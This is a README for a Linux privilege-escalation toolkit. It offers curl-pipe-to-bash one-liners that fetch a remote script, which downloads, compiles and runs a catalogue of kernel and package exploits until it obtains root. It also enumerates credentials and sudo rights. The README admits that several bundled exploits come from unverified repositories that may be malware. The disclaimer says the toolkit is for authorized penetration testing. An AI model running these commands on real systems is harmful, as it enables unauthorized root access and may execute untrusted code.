# Thiscitze AutoPrivEsc

Linux local privilege escalation toolkit: **Scan -> Match -> Exploit**.

One-liner that enumerates the target, checks kernel/glibc/package conditions with smart warnings, and tries every exploit in the collection — stopping the moment `root` is obtained.

> ⚠️ **For authorized security testing only.** Run this only on systems you own or have written permission to test. Unauthorized use is illegal in most jurisdictions.

## Quick Start

```bash
curl -fsSL https://raw.githubusercontent.com/thiscitze/autopwn/main/autopwn.sh | bash
```

No installation needed — the script downloads, compiles and runs everything from `/tmp` or another writable+executable location.

## Usage & Flags

| Flag | Description |
|------|-------------|
| *(none)* | Enumerate conditions, then try **all** exploits, stop on root |
| `--scan` | Run read-only enumeration first, then all exploits |
| `--scan-only` | Enumeration only — no exploits, no traces left |
| `-q` / `--quiet` | Compact output |
| `--cleanup` | Remove the workdir when finished |
| `--no-copyfail` | Skip the `copy.fail` payload (runs third-party code — risky) |
| `--workdir /path` | Force a specific writable+executable dir (skip auto-detect) |

### Examples

```bash
# Full run
curl -fsSL https://raw.githubusercontent.com/thiscitze/autopwn/main/autopwn.sh | bash

# Enumerate first, then exploit
curl -fsSL https://raw.githubusercontent.com/thiscitze/autopwn/main/autopwn.sh | bash -s -- --scan

# Read-only recon (no exploits, minimal traces)
curl -fsSL https://raw.githubusercontent.com/thiscitze/autopwn/main/autopwn.sh | bash -s -- --scan-only

# Quiet + cleanup after run
curl -fsSL https://raw.githubusercontent.com/thiscitze/autopwn/main/autopwn.sh | bash -s -- -q --cleanup

# Force a specific writable+executable dir
curl -fsSL https://raw.githubusercontent.com/thiscitze/autopwn/main/autopwn.sh | bash -s -- --workdir "$PWD"
```

## How It Works

1. **Scan** — OS, kernel, architecture, CPU, glibc version, network reachability.
2. **Enumeration** (`--scan`/`--scan-only`) — read-only checks: `sudo -l`, SUID binaries, capabilities, writable PATH, cron jobs, credentials, container detection, `/etc/passwd`.
3. **Match** — every exploit gets a smart pre-check (kernel range, glibc requirement, kernel config, service presence). If a condition doesn't match, a `[!]` warning is printed — **but the exploit is still attempted**.
4. **Exploit** — each attempt runs with a 90s timeout and is force-killed as a full process group if it hangs.
5. **Stop on root** — as soon as `id -u` returns 0, a banner is printed and everything halts.

## Exploit Collection

| Exploit | CVE | Condition checked |
|---------|-----|-------------------|
| PwnKit (+ alt POC) | CVE-2021-4034 | `pkexec` present, gcc |
| Dirty Pipe | CVE-2022-0847 | kernel 5.8–5.16 |
| GameOver(lay) | CVE-2023-2640/32629 | Ubuntu + OverlayFS |
| DirtyCred | — | kernel 5.14–6.x |
| DirtyFrag | — | kernel 6.1–6.6 |
| FragNesia | — | kernel 5.19–6.8 |
| eBPF LPE | — | `CONFIG_BPF*`, user-ns |
| nftables UAF | CVE-2023-32233 | `CONFIG_NF_TABLES` |
| SLUB Overflow | CVE-2022-29582 | kernel 5.10–5.17 |
| io_uring LPE | — | `CONFIG_IO_URING` |
| TONTOU | — | AMD Zen 2 |
| CVE-2026-46215 | — | kernel ≥ 7 |
| PackageKit | CVE-2026-41651 | PackageKit installed, glibc ≥ 2.33 |
| Polkit / DBus | CVE-2021-3560 | polkit present |
| runc breakout | CVE-2024-21626 | container detected |
| OVSwrap | — | Open vSwitch loaded |
| CVE-2026-31431 | — | unverified, always tried |
| CVE-2026-46300 | — | unverified binary, always tried |
| CVE-2026-64600 | — | unverified, always tried |
| CVE-2026-68138 | — | unverified, always tried |
| CVE-2026-68398 (gcc + make) | — | unverified, always tried |
| copy.fail | — | third-party payload, `--no-copyfail` to skip |

> Several `CVE-2026-*` entries come from unverified third-party repositories and are treated as suspicious. **Audit them before running** — some "exploit" repos distribute malware.

## Output & Logs

- Every attempt is logged to `exploit.log` in the workdir.
- A compact `[OK]/[FAIL]` summary is printed at the end with the reason (kernel range, glibc, exit code, timeout).
- Workdir is auto-picked from a writable **and executable** location (avoids `noexec /tmp`), trying `$PWD`, `$TMPDIR`, `$HOME/.cache`, `/var/tmp`, `/dev/shm`, `/tmp` — each failure is reported with its cause (not writable / noexec). On `--cleanup`, it is removed.
- If auto-detect fails, retry with `--workdir $PWD`.

## Why It Fails on Hardened Hosts

Common reasons the collection can't get root — all detected and reported:

- **grsecurity / hardened kernels** block the known kernel exploits
- **noexec mounts** prevent running compiled binaries
- **missing/disabled** kernel features (`CONFIG_BPF`, `CONFIG_IO_URING`, user namespaces, `AF_ALG`)
- **old glibc** rejecting precompiled binaries
- **patched systems** where the CVE is already fixed
- **unverified/fake exploit repos**

## License / Disclaimer

This tool is provided for **educational and authorized security testing purposes only**. The author is not responsible for misuse. Never run this against systems you do not own or lack written permission to test.
